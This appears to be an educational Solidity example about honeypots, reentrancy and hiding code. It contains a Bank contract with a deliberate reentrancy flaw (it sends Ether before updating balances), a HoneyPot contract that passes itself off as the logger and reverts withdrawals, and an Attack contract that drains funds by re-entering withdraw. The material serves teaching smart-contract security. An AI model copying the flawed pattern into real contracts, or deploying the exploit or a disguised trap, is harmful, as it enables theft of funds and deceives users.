// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;

/*
Honeypot - A honeypot is a trap to catch hackers
Example code - Reentrancy and hiding code
*/

contract Bank {
    mapping(address => uint) public balances;
    Logger logger;

    constructor(Logger _logger) public {
        logger = Logger(_logger);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value, "Deposit");
    }

    function withdraw(uint _amount) public {
        require(_amount <= balances[msg.sender], "Insufficient funds");

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] -= _amount;

        logger.log(msg.sender, _amount, "Withdraw");
    }
}

contract Logger {
    event Log(address caller, uint amount, string action);

    function log(address _caller, uint _amount, string memory _action) public {
        emit Log(_caller, _amount, _action);
    }
}

// In a separate file
contract HoneyPot {
    function log(address _caller, uint _amount, string memory _action) public {
        // if (_action == "Withdraw") { // can't compare string in solidity, need to compare hash
        if (equal(_action, "Withdraw")) {
            revert("It's a trap");
        }
    }

    function equal(
        string memory _a,
        string memory _b
    ) public pure returns (bool) {
        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));
    }
}

// In a separate file
contract Attack {
    Bank bank;

    constructor(Bank _bank) public {
        bank = Bank(_bank);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    function attack() public payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }
}
